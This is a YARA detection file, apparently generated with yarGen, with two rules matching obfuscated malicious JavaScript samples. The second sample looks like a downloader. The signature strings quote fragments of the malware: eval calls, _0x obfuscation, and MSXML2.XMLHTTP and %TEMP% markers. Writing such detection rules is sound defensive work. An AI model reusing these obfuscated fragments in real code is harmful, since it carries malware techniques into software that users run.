rule sig_9140fd537bf5f86928a95b306d11831a8e59717206767aae991c8331ebcf7bb2 {
   meta:
      description = "JS - file 9140fd537bf5f86928a95b306d11831a8e59717206767aae991c8331ebcf7bb2.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "9140fd537bf5f86928a95b306d11831a8e59717206767aae991c8331ebcf7bb2"
   strings:
      $s1 = ",_0x434463,_0x55a079){return _0x3756(_0x434463- -'0x176',_0x55a079);}JAeUEDglFuMwCbOIx=_0x47b9b1(AZMisUTXEvtponxKVad, _0x291a59(" ascii
      $s2 = "var _0x477d=['DuUOk','vBuUO','kvruU','OkvKu','UOkvj','uUOkv','mVuUO', 'kvxuU','Okvuu','UOkvR','MuUOk','vaiuU','OkvSu','UOkvN','v" ascii
      $s3 = "6,_0x56392d,_0x29bdfa){return _0x3756(_0x56392d- -'0x2bf',_0x51add8);}eval(_0x47b9b1(RtNipXmkCrUgazM,mnjZhCJtOSIXcaokrzf));" fullword ascii
      $s4 = "4){return _0x3756(_0x20efac- -'0x14e',_0x374f24);}try{setTimeout('',-0x3f3+0xc2*-0x5+0xdf*0xd);}catch(_0x5638f3){var _0x104003='" ascii
      $s5 = "',-'0x111',-'0x173',-'0x156',-'0x103')+_0x23f369(-'0x271', -'0x2f8',-'0x31c',-'0x2ad',-'0x251')+'aTuUO'+_0x2b976d(-'0x12d',-'0x1" ascii
      $s6 = "bjyz', 'Vaibj','yzVSb','jyzVN','Cbjyz','V.bjy','zVShb','jyzVe','llEbj','yzVxb','cbjyz','Vutbj','yzVe(','\\x22bjyz','Vcbjy','zVmb" ascii
      $s7 = "xa4',-'0x6d', -'0xe5',-'0x33',-'0x38')+_0xcf8beb('0x1d9','0x1a9','0x1e6','0x19b','0x1f2')+_0x23f369(-'0x1d4',-'0x1c1',-'0x282',-" ascii
      $s8 = "0','0x291','0x264','0x227','0x285')+_0x2b976d(-'0xae',-'0x98',-'0x57',-'0xcf', -'0xc2')+_0x23f369(-'0x215',-'0x290',-'0x29c',-'0" ascii
      $s9 = "b7',-'0x1b9',-'0x203',-'0x22f',-'0x1e1')+_0x23f369(-'0x238',-'0x1d0', -'0x201',-'0x22e',-'0x1c8')+_0x291a59('0x2ec','0x29a','0x2" ascii
      $s10 = "xe4',-'0xe6',-'0x78',-'0x153')+_0x2b976d(-'0x5e',-'0x22',-'0x85',-'0x9f',-'0xb6')+_0x23f369(-'0x21d', -'0x1f8',-'0x20a',-'0x1ce'" ascii
      $s11 = "_0xcf8beb('0x1d8','0x1b4','0x1f0','0x1a7','0x141')+_0x5b4608(-'0xd2',-'0xb1',-'0x147',-'0x117',-'0xc9')+_0x5b4608(-'0x13b', -'0x" ascii
      $s12 = "\\x20uUO','kv=uU','Okv\\x20n','ew\\x20Au','UOkvc','tivuU','OkveX','OuUOk','vbjec','tuUOk','v(\\x22uU','OkvsH','euUOk','vLuUO','k" ascii
      $s13 = "0', -'0xe3')+_0x291a59('0x26d','0x267','0x276','0x2f8','0x2d6')+_0xcf8beb('0x18f','0x13c','0x190','0x1b0','0x1c3')+_0x2b976d(-'0" ascii
      $s14 = "608(-'0x12e',-'0x106', -'0x11e',-'0x176',-'0x13a')+_0x2b976d(-'0x106',-'0x10e',-'0x143',-'0xb0',-'0x177')+_0x23f369(-'0x288',-'0" ascii
      $s15 = "8(-'0xb2', -'0x75',-'0x48',-'0xa2',-'0x2c')+_0x5b4608(-'0x27',-'0x103',-'0x110', -'0xa1',-'0x49')+_0x23f369(-'0x281',-'0x2a0',-'" ascii
      $s16 = "+_0x5b4608(-'0xc1',-'0x9d',-'0x5f', -'0xad',-'0x7e')+_0x2b976d(-'0x84',-'0x95',-'0x2e',-'0xaa',-'0xd7')+_0x2b976d(-'0x83',-'0x7d" ascii
      $s17 = "7f')+_0x5b4608(-'0x14f',-'0xe8',-'0xcf',-'0x101', -'0xf9')+_0x2b976d(-'0xc6',-'0x12b',-'0xb5',-'0xd1',-'0xed')+_0xcf8beb('0x234'" ascii
      $s18 = "9',-'0xfd',-'0x93')+_0x5b4608(-'0x104', -'0xb2',-'0xf1',-'0xfc',-'0x161')+_0xcf8beb('0x184', '0x1a4','0x20b','0x19b','0x1db')+_0" ascii
      $s19 = "-'0x5d',-'0x37')+_0x2b976d(-'0xb0',-'0xe2', -'0xf0',-'0x65',-'0x52')+_0x291a59('0x32e','0x2ae','0x2e2','0x2d6','0x2ea')+_0x291a5" ascii
      $s20 = "', -'0x6b',-'0x38',-'0x92')+_0x291a59('0x27f','0x24a','0x238','0x2e6','0x29d')+_0x291a59('0x2ff','0x295','0x329','0x316','0x2e6'" ascii
   condition:
      uint16(0) == 0x6176 and filesize < 60KB and
      8 of them
}

rule sig_0648670d390d0fbf8d8481d6c269e1196140fc57c1535c2818ea9ddca07d61f0 {
   meta:
      description = "JS - file 0648670d390d0fbf8d8481d6c269e1196140fc57c1535c2818ea9ddca07d61f0.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-15"
      hash1 = "0648670d390d0fbf8d8481d6c269e1196140fc57c1535c2818ea9ddca07d61f0"
   strings:
      $s1 = "//Coded By Pjoao1578" fullword wide
      $s2 = "%TEMP%!...........!'" fullword wide
      $s3 = "MSXML2.XMLHTTP!...........!'" fullword wide
      $s4 = "var wdffBMdpwu;" fullword wide
      $s5 = "wdffBMdpwu = [\"\"," fullword wide
      $s6 = "\"\"].join(\"\\n\");" fullword wide
      $s7 = "var _0xa7e8=[\"\",\"\\x6A\\x6F\\x69\\x6E\",\"\\u2193\\u2192\\u21A8\\u2191\\u221F\\u2022\\u2194\\u221F\",\"\\x73\\x70\\x6C\\x69" wide
      $s8 = "eval(wdffBMdpwu);" fullword wide
      $s9 = "(0);\"," fullword wide
      $s10 = "GET!...........!'" fullword wide
      $s11 = ", 2)\"," fullword wide
   condition:
      uint16(0) == 0xfeff and filesize < 50KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

